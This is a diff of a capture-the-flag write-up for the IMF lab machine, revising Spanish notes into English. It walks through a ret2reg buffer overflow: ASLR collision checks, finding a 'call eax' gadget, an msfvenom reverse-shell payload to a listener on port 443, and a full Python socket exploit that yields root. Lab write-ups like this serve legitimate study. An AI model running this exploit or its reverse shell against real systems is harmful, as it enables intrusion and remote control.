@@ -2174,20 +2174,17 @@ le't me explain you how we will take advantage of it
 
 first in the last example we saw that eax direction did not change too much and the ASLR is activated 
 
-let's verify vamos a buscar colisiones esto con el fin de hacer un retret
+let's verify We are going to look for collisions in order to perform an analysis
 
-primero que todo debemos tener en cuenta que Eax equivale a 32 bits entonces si yo le pregunto a gef por una cadena del 1 al 32 de eax es valido ya que eax tiene un valor de 32 bits basicamente en este ejemplo
-hariamos un cat y el output pues seria el de eax asi de facil pero para que sepas aqui en gdb uno puede ver mas registros supongamos que queremos ver lo hay -4 espacios de eax o sea le hariamos un cat a eax menos 4 entonces como en esta caso usamos gbd en lugar de cat le podemos decir  x/32 $eax-4 enntonces me mostrara un output menos 4 espacios antes del eax 
-
-entonces si yo busco por x32$eax entonces le estoy diciendo ponme todo eax para verificar donde se estan almacenando lo valores recordemos que si encontramos algo como \x41 es A y 
+First of all, we must take into account that EAX is equivalent to 32 bits. So, if we ask GEF for a string from 1 to 32 of EAX, it is valid, since EAX has a value of 32 bits. Basically, in this example, we would do a cat and the output would be that of EAX, as simple as that. But just so you know, here in GDB one can see more registers. Let's say we want to see what is in EAX minus 4 spaces, so we would do a cat to EAX minus 4. But in this case, since we are using GDB instead of cat, we can use the command x/32 $eax-4, which will show me an output 4 spaces before EAX. So, if I search for x32$eax, I'm telling it to show me everything in EAX to verify where the values are being stored. Let's remember that if we find something like \x41, it means 'A'.
 ```bash 
-y como sabemos \x41 es A 
-y como sabemos \x42 es B 
-y como sabemos \x43 es C 
+as we know \x41 means A 
+as we know \x42 means B 
+as we know \x43 means C 
 ```
-entonces si vemos un output asi ya sabriamos identificarlo 
+Then, if we see an output like this, we would already know how to identify it
 
-y mira hablando de eso, encontramos A's
+And look, speaking of that, we found A's.
 ```bash 
 gef➤  x/32 $eax
 0xffffd344:	0x41414141	0x41414141	0x41414141	0x41414141
@@ -2195,7 +2192,7 @@ gef➤  x/32 $eax
 0xffffd364:	0x41414141	0x41414141	0x41414141	0x41414141
 0xffffd374:	0x41414141	0x41414141	0x41414141	0x41414141
 ```
-si retrosedo -4 espacios usando eax como referencia entonces podriamos ver otros registros 
+If I go back 4 spaces using EAX as a reference, then we could see other registers
 ```bash
 gef➤  x/16 $eax-4
 0xffffd340:	0x804b02c	0x41414141	0x41414141	0x41414141
@@ -2203,26 +2200,19 @@ gef➤  x/16 $eax-4
 0xffffd360:	0x41414141	0x41414141	0x41414141	0x41414141
 0xffffd370:	0x41414141	0x41414141	0x41414141	0x41414141
 ```
-esto es solo para mostrarte a mas detalle donde se almacenan los registros no te me confundas ahora vamos a ver como solucionamos la aleatorizacion
-entonces la idea es 
 
-ldd agent
+This is just to show you in more detail where the registers are stored. Don't get confused now,
 
-le podrias hacer un ldd para ver las librerias compartidas y vemos 
 
-y si luego filtrasmos con grep con libc 
+let's see how we solve the randomization. So, the idea is to do ```'ldd agent'``` to see the shared libraries, and then filter with ```'grep libc'.``` After that, we use ```'awk'``` to get the last argument of the output and remove the parentheses with ```'tr -d '()''.```
 
-y luego filtramos con awk para quedarnos con el ultimo argumento de el output y luego le borras los parentisis o sea 
+```'ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()''.```
 
-ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()'
+Then, to check how ASLR works, we make a sequence from 1 to 19 and run the same command:
 
-while true; do ldd agent  | grep libc; done | grep " "
+```for i in $(seq 1 19); do ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()'; done```
 
-pero si luego verificamos el ASLR como trabaja
-haciendo una secuencia del 1 al 19
-
-for i in $(seq 1 19); do ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
-output 
+Output:
 
 ```bash
 ❯ for i in $(seq 1 19); do ldd agent | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
@@ -2246,12 +2236,11 @@ output
 0xf7cc4000
 0xf7d7e000
 ```
-aqui podemos ver que a causa del ASLR la memoria cambia pues si agarramos cualquier valor del output que nos dio ese filtro podemos volver a filtrar usando ese output que seleccionamos yo voy a agarrar el primero 
-o sea este ```0xf7d2c000```
+Here we can see that due to ASLR, the memory changes. If we take any value from the output that we got from that filter, we can filter again using that selected output. I'll take the first one, which is this one:  ```0xf7d2c000```
 
-while true; do ldd agent | grep libc; done | grep "0xf7d2c000"
+```while true; do ldd agent | grep libc; done | grep "0xf7d2c000"```
 
-y como vemos hay colisiones 
+And as we can see, there are collisions.
 
 ```bash
 ❯ while true; do ldd agent | grep libc; done | grep "0xf7d2c000"
@@ -2266,30 +2255,27 @@ y como vemos hay colisiones
 	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
 	libc.so.6 => /lib32/libc.so.6 (0xf7d2c000)
 ```
-hay colisiones ya que hay veces que la memoria vale lo mismo 
+There are collisions because sometimes the memory has the same value. But that attack is called BOF [ret2libc](https://zeekk3n.github.io/andrey.github.io/.hacking-notes) 
 
-pero ese ataque se llama BOF [ret2libc](https://zeekk3n.github.io/andrey.github.io/.hacking-notes) 
+Here we are going to exploit the ret2reg
 
-aqui vamos a explotar el ret2reg 
+Although if that fails, we could simply do a ret2libc, which is the buffer overflow + a brute force attack. As we saw, there are collisions in the memory, which means that sometimes the memory repeats. So we could take advantage of that by sending the buffer overflow request so many times that one of them will match with the collision in the memory. 
 
-aunque si falla simplemente podriamos hacer un re2libc que es el bufferoverflow + un ataque de fuerza bruta como vimos que hay colisiones en la memoria o sea hay veces que la memoria repite, entonces podriamos de aprovecharnos de eso enviando la solicitud del bufferoverflow tantas veces que alguna de ellas va a calzar con la colicion de la memoria 
+If it fails for you, here is a well-explained solution [ret2libc](https://zeekk3n.github.io/andrey.github.io/.hacking-notes) I did this to have several options in case we encounter a BOF. But this happens because the binary is 32-bit, right? If you have a binary that is not 32-bit, things change because the ret2reg is contained within the binary in EAX.
 
-si a ti te falla aqui esta bien explicado [ret2libc](https://zeekk3n.github.io/andrey.github.io/.hacking-notes) esto lo hice para tener varias opciones en caso de que veamos un bof pero esto pasa porque el binario es de 32 bits verdad si tu tienes un binario que no sea de 32 bits cambia la cosa 
-porque esta contenido dentro del binario el eax ret2reg
-
-bueno como dije vamos a explotar un ret2reg que en resumen es como hay aleatorizacion en la memoria nosotros tendriamos que apuntar a un lugar donde no cambie entonces 
+Well, as I said, we're going to exploit a ret2reg, which in summary is that since there is randomization in memory, we would have to point to a location that doesn't change.
 
 ```bash
 with /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 nasm >  
 ```
-entonces mira
+So look,
 
-si el eax esta en el inicio del programa entonces podriamos hacer un ataque de bof ret2reg
+If eax is at the beginning of the program then we could do a ret2reg bof attack.
 
-en un ataque ret2reg nosotros prodiamos decirle a el Eip que apunte al eax si eax se encuentra al inicio del programa y luego seguiria mi shell code porque seguiria el esp entonces por ende me interpretaria el shell code
+In a ret2reg attack, we could tell Eip to point to eax if eax is located at the beginning of the program and then my shell code would follow because esp would follow. So, it would interpret my shell code.
 
-y aqui vemos que eax si esta al inicio y luego seguiria esp donde meteria mi shell code porque le diria a eip ok apuntame a eax que seria lo que esta antes de mi shell code 
+And here we see that eax is at the beginning and then esp would follow where I would put my shell code because I would tell eip ok point me to eax which is what is before my shell code.
 
 ```bash
 gef➤  x/16 $eax-4
@@ -2299,10 +2285,8 @@ gef➤  x/16 $eax-4
 0xffffd370:	0x41414141	0x41414141	0x41414141	0x41414141
 
 ```
-esto seria eax ```0x804b02c``` pero vamos a buscarlo con nsashell haciendo un call eax 
+this would where eax is located ```0x804b02c``` before of our A's so ```we need to locate a call eax``` using ```nsashell``` 
 
-
-entonces como dijimos vamos a usar esta herramienta 
 
 ```bash 
 ❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
@@ -2312,8 +2296,7 @@ nasm > Interrupt: use the 'exit' command to quit
 nasm > exit
 
 ```
-entonces el call eax en ensamblador seria FF D0 si nosotros tomamos esa direcccion y la filtramos usando ubjet dump -D mas el binario podrimos ver la direccion de eax 
-
+So as we said, we're going to use this tool. So the call eax in assembly would be FF D0. If we take that address and filter it using ``objdump -D`` with the binary, we could see the address of eax.
 
 
 ```bash 
@@ -2321,10 +2304,10 @@ entonces el call eax en ensamblador seria FF D0 si nosotros tomamos esa direccci
  8048563:	ff d0                	call   *%eax
 
 ```
-como podemos ver la direccion de eax seria ```8048563```
+as we can noticed call eax equals to  ```8048563```
 
 
-entonces lo que seguiria seria hacer un script con un shellcode de 168 bits con metasploit
+Then, what would follow is to create a script with a 168-bit shellcode using Metasploit
 
 ```bash 
 ❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.53 LPORT=443 -b "\x00\x0a\x0d" -f python
@@ -2348,12 +2331,12 @@ buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"
 
 ```
 
-aqui tendriamos que revisar si el binario que nos hizo metasploit vale 168 que es lo que vale eip recordemos que eip es el que manda 
+here we would have to check if the binary that Metasploit generated for us is 168 bytes long, which is what EIP holds. Remember that EIP is the one in charge.
 
 
-y en el mismo output dice aqui ```Payload size: 95 bytes```
+in the output we can check it ```Payload size: 95 bytes```
 
-pero recordemos que para usar el eip necesitamos 168 o sea nos faltan 73 la idea es que te copies esto 
+But remember that to use the EIP we need 168, which means we are missing 73. The idea is for you to copy this.
 
 ```bash 
 buf =  b""
@@ -2369,17 +2352,7 @@ buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"
 ```
 
 
-luego vamos a tomar ese script y hacer otro script pero ya manual
-
-
-lo vamos a hacer en python
-
-
-
-
-y aqui agregamos los valores encontrados 
-cuales 
-seria el offset de eip que seria 168  entonces 
+Then we are going to take that script and make another one manually, we will do it in Python. Remember to do it in tmp on the victim machine that we gained access to. And here we add the values ​​found, which would be the EIP offset, which is 168, then.
 
 
 ```bash 
@@ -2388,7 +2361,7 @@ seria el offset de eip que seria 168  entonces
 offset = 168
 
 ```
-seria el shellcode 
+add the shellcode 
 ```bash 
 #!usr/bin/python3
 
@@ -2406,7 +2379,7 @@ buf += b"\xe9\xd4\x6b\xfb\x6b\xb7\x3a\xa8\xc0\x34\x34\xaf"
 buf += b"\xea\xbb\x14\x47\x9b\x94\xeb\xff\x0b\xc4\x24\x9d"
 buf += b"\xa2\x93\xd8\x33\x66\x2d\xff\x03\x83\xe0\x80"
 ```
-vamos a definir los 73 que nos faltan 
+Let's define the missing 73 bytes
 
 ```bash 
 #!usr/bin/python3
@@ -2431,8 +2404,7 @@ print (len(buf))
 
 ```
 
-le diremos que nos printee buf a ver cuanto es para verificar que toodo esta bien 
-
+We will tell it to print buf to see how big it is and verify that everything is fine
 
 ```bash 
 ❯ python3 machinecode.py
@@ -2440,13 +2412,13 @@ le diremos que nos printee buf a ver cuanto es para verificar que toodo esta bie
 
 ````
 
-y si todo esta bien eliminemos el print y todo estaria bien 
+Then, if everything is fine, let's remove the print and everything will be okay.
 
-lo que seguiria seria la llamada a eax
+What follows is the call to eax.
 
-el salto siempre va a ser al reves recordemos que el salto a eax seria ```8048563```
+The jump is always going to be backwards, remember that the jump to eax would be  ```8048563```
 
-entonces la idea es agreagarlo a el script ```buf += b"\x63\x85\x04\08" #8048563```
+So, the idea is to add it to the scriptt ```buf += b"\x63\x85\x04\08" #8048563```
 
 ```bash 
 #!usr/bin/python3
@@ -2470,92 +2442,74 @@ buf += b"A"*(offset-len(buf))
 buf += b"\x63\x85\x04\08" #8048563
 ```
 
-ahora la idea es jugar con socket para conectarse al programa y al puerto 7788 donde se esta ejecutando el agent  pero acordemonos que hay que poner un id code y presionar el 3 
+The idea now is to play with ```socket``` to connect to the program and the ```port 7788``` where the agent is running, but we must remember to put an ID code and press 3.
 
-primero vamos a definir un descriptor de archivo =s 
+First, we will define a file descriptor ```s = as socket.socket(socket.AF_INET, socket.SOCK_STREAM)``` because it is a ```TCP ``` connection. Where do we want to connect? Well, we want to connect to the localhost because this is where the agent is running ```s.connect(('127.0.0.1', 7788)).```
 
-socket.socket(socket.AF_INET, socket.SOCK_STREAM) porque es una conexion por tcp  a donde ?
+With this, we are just connecting, but we must remember to give it an ID, press enter, press 3, press enter again, and then send the code. So, we will use the file descriptor to send the data that we want, which in this case would be ```s.send(b"48093572\n"). ```We use b to encode the string to bytes.
 
-pues nos queremos connectar al localhost porque aqui es donde se esta ejecutando el agent 
+It would be good to check if we were able to log in, and we can do this with a print. We must also tell the program that we received data by adding ```data = s.recv(1024) ```after sending the data. We can then print the received data with print data.
 
-s.connect(('127.0.0.1'))
-por cua puerto ?
+If we see the output ```Login validated``` , then we know it worked.
 
-s.connect(('127.0.0.1, 7788))
 
-con esto solo nos conectamos verdad pero recordemos que hay que darle un id y luego un enter y  luego un 3 y luego un enter y luego enviar el code 
-
-entonces nos vamos a aprovechar de descriptor de archivo para enviar la data  que me intertesa seria
-
-s.send que quieres enviar la data bueno seria (b"48093572") y ahora meteriamos un linefit que funciona como enter entonces seria
-
-s.send(b"48093572\n") 
-
-seria bueno corroborar a ver si nos loggea 
-
-esto lo hariamos con print y recordemos que siempre que recibimos datos hay que decirle al programa que recibimos datos = data = s.recv(1024) 
-
-data = s.recv(1024) 
-
-print data
-
-y vemos que si 
 
 ```Login validated```
-ahora borramos print ya que no vale la pena hacer eso solo lo usamos para ver si nos loggeaba 
+now we delete the print since it's not worth doing that, we only used it to see if we were logged in.
 
+Now, we have to press 3, right? so it would be s.send(b"3") and then we play with a line fit \n s.send(b"3\n")
 
-ahora hay que darle al 3 no ? entonces seria s.send(b"3") y luego igual jugamos con un line fit \n s.send(b"3\n")
+then we receive data
 
-luego recibimos datos 
+data = s.recv(1024)
 
-data = s.recv(1024) 
+and now we send the buf string
 
-y ahora si enviamos la cadena buf 
+s.send (buf) but remember that when we put the A's, we had to hit enter, so we should edit buf. This buf buf += b"\x63\x85\x04\08" #8048563
 
-s.send (buf) pero recordemos que cuando colocabamos las A's habia que darle al enter entonces debemos editar  buf este buf buf += b"\x63\x85\x04\08" #8048563
-
-entonces seria 
+then it would be
 
 ```bash 
-       │ File: exploit.py
-───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ #!/usr/bin/python3
-   2   │ 
-   3   │ import socket
-   4   │ 
-   5   │ offset = 168
-   6   │ 
-   7   │ buf =  b""
-   8   │ buf += b"\xd9\xf6\xb8\x7d\xf9\xd3\x7f\xd9\x74\x24\xf4\x5b"
-   9   │ buf += b"\x29\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x13\x03\x3e"
-  10   │ buf += b"\xea\x31\x8a\xf1\xd7\x41\x96\xa2\xa4\xfe\x33\x46"
-  11   │ buf += b"\xa2\xe0\x74\x20\x79\x62\xe7\xf5\x31\x5c\xc5\x85"
-  12   │ buf += b"\x7b\xda\x2c\xed\xbb\xb4\xab\xd8\x53\xc7\x33\x23"
-  13   │ buf += b"\x1f\x4e\xd2\x93\x39\x01\x44\x80\x76\xa2\xef\xc7"
-  14   │ buf += b"\xb4\x25\xbd\x6f\x29\x09\x31\x07\xdd\x7a\x9a\xb5"
-  15   │ buf += b"\x74\x0c\x07\x6b\xd4\x87\x29\x3b\xd1\x5a\x29"
-  16   │ 
-  17   │ 
-  18   │ #padding
-  19   │ 
-  20   │ buf += b"A"*(offset-len(buf))
-  21   │ 
-  22   │ buf += b"\x63\x85\x04\x08\n" # 8404654651
-  23   │ 
-  24   │ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  25   │ s.connect(('127.0.0.1', 7788))
-  26   │       
-  27   │ s.send(b"48093572\n")
-  28   │ data = s.recv(1024)
-  29   │ s.send(b"3\n")
-  30   │ data = s.recv(1024)
-  31   │ s.send(buf)
-───────┴──────────────────
+ 
+#!/usr/bin/python3
 
+import socket
+
+offset = 168
+
+buf =  b""
+buf += b"\xd9\xf6\xb8\x7d\xf9\xd3\x7f\xd9\x74\x24\xf4\x5b"
+buf += b"\x29\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x13\x03\x3e"
+buf += b"\xea\x31\x8a\xf1\xd7\x41\x96\xa2\xa4\xfe\x33\x46"
+buf += b"\xa2\xe0\x74\x20\x79\x62\xe7\xf5\x31\x5c\xc5\x85"
+buf += b"\x7b\xda\x2c\xed\xbb\xb4\xab\xd8\x53\xc7\x33\x23"
+buf += b"\x1f\x4e\xd2\x93\x39\x01\x44\x80\x76\xa2\xef\xc7"
+buf += b"\xb4\x25\xbd\x6f\x29\x09\x31\x07\xdd\x7a\x9a\xb5"
+buf += b"\x74\x0c\x07\x6b\xd4\x87\x29\x3b\xd1\x5a\x29"
+
+
+#padding
+buf += b"A"*(offset-len(buf))
+buf += b"\x63\x85\x04\x08\n" # 8404654651
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1', 7788))
+
+s.send(b"48093572\n")
+data = s.recv(1024)
+s.send(b"3\n")
+data = s.recv(1024)
+s.send(buf)
 ````
-who ami 
+now the idea is to execute it in the target machine 
 
+www-data@imf:/$python3 exploit.py
+
+whoami 
+```
+root@imf:/$whoami
+root
+```
+let's check the flags
 ```bash 
 cat Flag.txt
 flag6{R2gwc3RQcm90MGMwbHM=}
@@ -2598,98 +2552,3 @@ Testers: dook (@dooktwit), Menztrual (@menztrual), llid3nlq and OJ(@TheColonial)
 root@imf:/root# 
 
 ```
-
-
-a la direccion a la que lo queremos enviar y vear si nos tramita una direccion ip 
-
-aja y que mas pues como el code que hicimos en metasploit esta hehco para que envie una traza a el puerto 443 
-
-entonces di vamos a ponernos en escucha del puerto 443 entonces se supone que si root esta ejeecutando este programa me daria una reverseshell al puerto 443 
-
-esperemos a ver porque nosotros no lo sabemos pero aun asi vimo un usuario que se llama setup talvez usando este usuario podriamos ganar acceso pero vamos a hacerlo a ver si funka
-
-
-
-luego tendriamos que hacer la llamada
-
-
-
-
-entonces lo suyo seria buscar donde comienza eax y con esto podemos usar 
-output 
-```bash 
-nasm > call eax
-00000000  FFD0              call eax
-nasm > 
-```
-
-now with object dump we will 
-
-
-with objdump 
-```bash 
-objt dump -D agent | grep "FF D0" -i
-```
-
-
-
-
-asd
-```bash 
-        ESP                          |       EBP           | EIP
-+------------------------------------+---------------------+------+-----+
-| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
-+------------------------------------+---------------------+------+-----+
-```
-asd
-
-```bash 
-        ESP                          |       EBP           | EIP
-+------------------------------------+---------------------+------+-----+
-| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
-+------------------------------------+---------------------+------+-----+
-```
-asd
-
-
-```bash 
-        ESP                          |       EBP           | EIP
-+------------------------------------+---------------------+------+-----+
-| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
-+------------------------------------+---------------------+------+-----+
-```
-asd
-
-
-```bash 
-        ESP                          |       EBP           | EIP
-+------------------------------------+---------------------+------+-----+
-| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
-+------------------------------------+---------------------+------+-----+
-```
-asd
-
-
-```bash 
-        ESP                          |       EBP           | EIP
-+------------------------------------+---------------------+------+-----+
-| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
-+------------------------------------+---------------------+------+-----+
-```
-asd
-
-```bash 
-+---------------------+---------------------+------+-----+---------------------+----------------+
-| Field               | Type                | Null | Key | Default             | Extra          |
-+---------------------+---------------------+------+-----+---------------------+----------------+
-```
-asd
-```bash 
-+---------------------+---------------------+------+-----+---------------------+----------------+
-| Field               | Type                | Null | Key | Default             | Extra          |
-+---------------------+---------------------+------+-----+---------------------+----------------+
-```
-
-
-
-i am still working on it ...
